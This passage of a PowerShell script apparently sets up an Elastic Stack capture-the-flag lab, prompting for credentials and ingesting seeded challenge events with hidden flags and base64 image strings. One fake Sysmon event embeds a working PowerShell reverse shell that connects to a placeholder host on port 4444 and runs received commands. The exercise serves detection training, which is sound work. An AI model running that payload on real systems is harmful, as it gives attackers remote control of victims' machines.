                    # When no passwords were generated, then prompt for credentials
                    $elasticCreds = Get-Credential elastic
                }
                
                # Set passwords via automated configuration or manual input
                # Base64 Encoded elastic:secure_password for Kibana auth
                $elasticCredsBase64 = [convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($($elasticCreds.UserName+":"+$($elasticCreds.Password | ConvertFrom-SecureString -AsPlainText)).ToString()))
                $kibanaAuth = "Basic $elasticCredsBase64"
                
                # Extract custom settings from configuration.json
                $configurationSettings = Get-Content ./configuration.json | ConvertFrom-Json
                
                $Elasticsearch_URL = $configurationSettings.Elasticsearch_URL
                $Kibana_URL = $configurationSettings.Kibana_URL
                     
                # 3. Check to see if Elasticsearch is available for use.
                Invoke-CheckForElasticsearchStatus
                
                $configurationSettings.initializedElasticStack = "true"
                $configurationSettings | Convertto-JSON | Out-File ./configuration.json -Force
                
                Write-Host "But first, please navigate to your Kibana instance to make sure you can log in.`nCopy and Paste the URL below to navigate to Kibana (ctrl-click might not work):" -ForegroundColor Yellow
                Write-Host $Kibana_URL -ForegroundColor DarkCyan
                Write-Host "Username : elastic`nPassword : $elasticsearchPassword"

                $finished = $true
                break
            }
            '5' {
                # 5. Import Objects and Index Documents for Elastic Stack

                # Extract custom settings from configuration.json if it exists
                $configurationSettings = Get-Content ./configuration.json | ConvertFrom-Json
                if($null -ne $configurationSettings.Elasticsearch_URL){
                    Write-Host "Elasticsearch URL detected: $Elasticsearch_URL" -ForegroundColor Green
                    $Elasticsearch_URL = $configurationSettings.Elasticsearch_URL
                }
                if($null -ne $configurationSettings.Kibana_URL){
                    Write-Host "Kibana URL detected: $Kibana_URL" -ForegroundColor Green
                    $Kibana_URL = $configurationSettings.Kibana_URL
                }

                if($null -eq $Elasticsearch_URL){
                    Write-Host "Elasticearch URL required." -ForegroundColor Yellow
                    $Elasticsearch_URL = Read-Host "Enter full Elasticsearch URL. Example: https://127.0.0.1:9200"
                }

                if($null -eq $Kibana_URL){
                    Write-Host "Kibana URL required." -ForegroundColor Yellow
                    $Kibana_URL = Read-Host "Enter full Kibana URL. Example: http://127.0.0.1:5601"
                }


                # Configure Elasticsearch credentials for importing saved objects into Kibana.
                # Get elastic user credentials
                Write-Host "Going to need the password for the elastic user." -ForegroundColor Yellow
                $elasticCreds = Get-Credential elastic
                
                # Set passwords via automated configuration or manual input
                # Base64 Encoded elastic:secure_password for Kibana auth
                $elasticCredsBase64 = [convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($($elasticCreds.UserName+":"+$($elasticCreds.Password | ConvertFrom-SecureString -AsPlainText)).ToString()))
                $kibanaAuth = "Basic $elasticCredsBase64"
                     
                # 3. Check to see if Elasticsearch is available for use.
                Invoke-CheckForElasticsearchStatus
                
                # Ingesting Documents
                Write-Host "Ingesting documents for challenges" -ForegroundColor Blue
                
                # Challenge 5 & 12
                $dateNow = ($(Get-Date -AsUTC)).ToString("o")
                $challenge5_12 = [PSCustomObject]@{
                    '@timestamp' = $dateNow
                    message = "Just a regular event log, nothing to see here."
                    tags = @("critical")
                    host = [PSCustomObject]@{
                        name = "not_nics_machine"
                    }
                    process = [PSCustomObject]@{
                        name = "yams.exe"
                        command_line = @'
                        powershell -NoProfile -WindowStyle Hidden -Command "& {
                      $host = 'not-a-malware-c2';
                      $port = 4444;
                      $secret_key_1 = "{ctf_c2_with_powershell_is_fun}"
                      $client = New-Object System.Net.Sockets.TCPClient($host, $port);
                      $stream = $client.GetStream();
                      [byte[]]$buffer = New-Object byte[] 1024;
                      while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                          $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
                          $result = iex $data 2>&1 | Out-String;
                          $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
                          $stream.Write($response, 0, $response.Length);
                          $stream.Flush();
                      }
                      $client.Close();
'@
                    }
                } | ConvertTo-Json
                $ingestIndexIDURL = $Elasticsearch_URL+"/logs-windows.sysmon-default/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0"

                # Challenge 6
                $futureDate = ($(Get-Date -AsUTC).AddMonths(6)).ToString("o")
                $challenge6 = [PSCustomObject]@{
                    '@timestamp' = $futureDate
                    message = "hello from the future"
                    custom_field = "{ctf_where_we_goin_we_dont_need_roads}"
                } | ConvertTo-Json

                # Challenge 9
                $dateNow = ($(Get-Date -AsUTC)).ToString("o")
                $challenge9 = [PSCustomObject]@{
                    '@timestamp' = $dateNow
                    message = "Just a regular event log, nothing to see here."
                    tags = @("e2","N0","Zl","9o","YX","lf","aW","5f","dG","hl","X2","5l","ZW","Rs","ZV","9z","dG","Fj","a3","0=")
                } | ConvertTo-Json

                # Challenge 10
                $dateNow = ($(Get-Date -AsUTC)).ToString("o")
                $challenge10 = [PSCustomObject]@{
                    '@timestamp' = $dateNow
                    message = "Just a regular event log, nothing to see here."
                    special = @(
  "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